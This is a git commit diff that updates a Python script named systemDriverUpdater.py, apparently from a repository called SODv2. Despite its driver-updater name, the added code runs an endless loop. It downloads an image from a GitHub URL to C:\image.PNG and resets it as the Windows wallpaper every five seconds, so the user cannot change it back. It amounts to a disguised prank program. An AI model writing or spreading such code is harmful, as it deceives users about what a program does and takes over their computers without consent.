ffffc96c8374f463aa1fe0a2d99b2a05df144775
Calvin_Coolest <107697031+Calvin-CoolestYT@users.noreply.github.com>
2023-06-28 09:45:37 -0500

    Update systemDriverUpdater.py

--- systemDriverUpdater.py
+++ systemDriverUpdater.py
@@ -1,7 +1,16 @@
+import requests
+import os.path
+import ctypes
 from time import sleep
 
+
 while True:
-    import ctypes
+    
+    if os.path.isfile("C:\image.PNG") == False:
+        url = 'https://raw.githubusercontent.com/Calvin-CoolestYT/SODv2/main/image.PNG'
+        r = requests.get(url, allow_redirects=True)
+        open('C:\image.PNG', 'wb').write(r.content)
+
     ctypes.windll.user32.SystemParametersInfoW(20, 0, r"C:\image.PNG", 0)
 
     sleep(5)
